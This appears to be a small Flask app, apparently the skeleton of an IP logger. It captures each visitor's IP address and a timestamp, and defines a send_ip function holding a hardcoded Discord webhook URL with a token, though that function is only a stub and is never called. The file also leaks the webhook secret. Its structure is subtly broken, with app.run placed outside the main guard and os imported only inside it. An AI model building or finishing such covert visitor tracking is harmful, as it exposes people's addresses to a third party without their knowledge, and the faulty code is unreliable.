from flask import Flask, request, redirect
from datetime import datetime
import requests

app = Flask(__name__)

def send_ip(ip, date):
    webhook_url = "https://discord.com/api/webhooks/1450627153438838824/cWJswEtlLVgEjPnG7zkzQJA2HLTCImHMMh8Riy7Zz8aWFJKqKYTJ7vu-eT3RCBfx7ooj"  # Replace with your actual webhook URL
    pass

@app.route("/")
def index():
    ip = request.environ.get("HTTP_X_FORWARDED_FOR", request.remote_addr)
    date = datetime.today().strftime("%Y-%m-%d %H:%M:%S")
    return "hello world"

if __name__ == "__main__":
    import os

app.run(
    host="0.0.0.0",
    port=int(os.environ.get("PORT", 5000))
)

